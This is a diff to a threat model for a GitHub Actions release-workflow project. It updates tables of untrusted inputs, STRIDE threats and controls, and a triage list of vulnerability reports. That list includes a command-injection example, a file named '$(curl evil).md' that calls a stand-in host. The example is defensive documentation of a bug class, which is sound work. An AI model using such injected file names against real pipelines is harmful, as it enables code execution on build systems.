@@ -52,20 +52,21 @@ An attacker who controls any of these already has what github-workflows could gi
 
 ## Untrusted inputs
 
-| Input                         | Comes from                  | What github-workflows guarantees                                                                |
-| ----------------------------- | --------------------------- | ----------------------------------------------------------------------------------------------- |
-| Pull request files            | Any contributor             | Read by read-only jobs only; inputs reach shells through environment variables.                 |
-| Artifacts from read-only jobs | Jobs that ran project code  | The writer accepts only the changelog and fragment deletions, as regular files, from the patch. |
-| Files already on PyPI         | A partial or earlier upload | Digests and attestations must match before the GitHub Release is published.                     |
+| Input                         | Comes from                  | What github-workflows guarantees                                                                     |
+| ----------------------------- | --------------------------- | ---------------------------------------------------------------------------------------------------- |
+| Pull request files            | Any contributor             | Read by read-only jobs only; inputs reach shells through environment variables.                      |
+| Artifacts from read-only jobs | Jobs that ran project code  | Each writer accepts only the paths its caller allows, as regular files or deletions, from the patch. |
+| Files already on PyPI         | A partial or earlier upload | Digests and attestations must match before the GitHub Release is published.                          |
 
 ## Threats and controls
 
-| STRIDE                 | Threat                                                                      | Control                                                                                             |
-| ---------------------- | --------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
-| Tampering              | A compromised build job smuggles a workflow change into the release commit. | `validate-release-patch` path and mode allowlist.                                                   |
-| Elevation of privilege | PR code reads the release App token.                                        | The token is minted only in the writer job, which runs no project code.                             |
-| Tampering              | A freshly published malicious tool version enters the release toolchain.    | Hash-checked locks resolved with a seven-day upload cooldown, and the same cutoff for helper tools. |
-| Repudiation            | Release commits cannot be traced to an approved run.                        | Commits and tags are authored by the App from a recorded workflow run.                              |
+| STRIDE                 | Threat                                                                                                                                                 | Control                                                                                                                                                                                                                    |
+| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Tampering              | A compromised build job smuggles a workflow change into the release commit.                                                                            | `validate-release-patch` path and mode allowlist.                                                                                                                                                                          |
+| Tampering              | A maintenance patch from a job that ran project code changes a path or mode outside the caller's allowlist, or replaces a reviewed maintenance branch. | `open-maintenance-pr` checks the digest a read-only job recorded, then the paths and modes, before minting the App token. Each run force-pushes only its own branch with a lease, and the pull request still needs review. |
+| Elevation of privilege | PR code reads the release App token.                                                                                                                   | The token is minted only in the writer job, which runs no project code.                                                                                                                                                    |
+| Tampering              | A freshly published malicious tool version enters the release toolchain.                                                                               | Hash-checked locks resolved with a seven-day upload cooldown, and the same cutoff for helper tools.                                                                                                                        |
+| Repudiation            | Release commits cannot be traced to an approved run.                                                                                                   | Commits and tags are authored by the App from a recorded workflow run.                                                                                                                                                     |
 
 ## Release chain
 
@@ -74,12 +75,13 @@ Callers pin the full commit SHA of a release.
 
 ## Vulnerability or bug
 
-| Report                                                      | Verdict       | Why                              |
-| ----------------------------------------------------------- | ------------- | -------------------------------- |
-| A fragment named `$(curl evil).md` runs in `validate-news`  | Vulnerability | PR data reached a shell as code. |
-| A release patch that edits `.github/workflows/` is accepted | Vulnerability | Allowlist bypass.                |
-| A caller runs the writer on `pull_request_target`           | Not ours      | Caller configuration.            |
-| A tool update waits seven days to land                      | Expected      | The cooldown is deliberate.      |
+| Report                                                                             | Verdict       | Why                                    |
+| ---------------------------------------------------------------------------------- | ------------- | -------------------------------------- |
+| A fragment named `$(curl evil).md` runs in `validate-news`                         | Vulnerability | PR data reached a shell as code.       |
+| A release patch that edits `.github/workflows/` is accepted                        | Vulnerability | Allowlist bypass.                      |
+| A maintenance patch whose caller allowlist admits `.github/workflows/` is accepted | Not ours      | The allowlist is caller configuration. |
+| A caller runs the writer on `pull_request_target`                                  | Not ours      | Caller configuration.                  |
+| A tool update waits seven days to land                                             | Expected      | The cooldown is deliberate.            |
 
 ## Severity
 
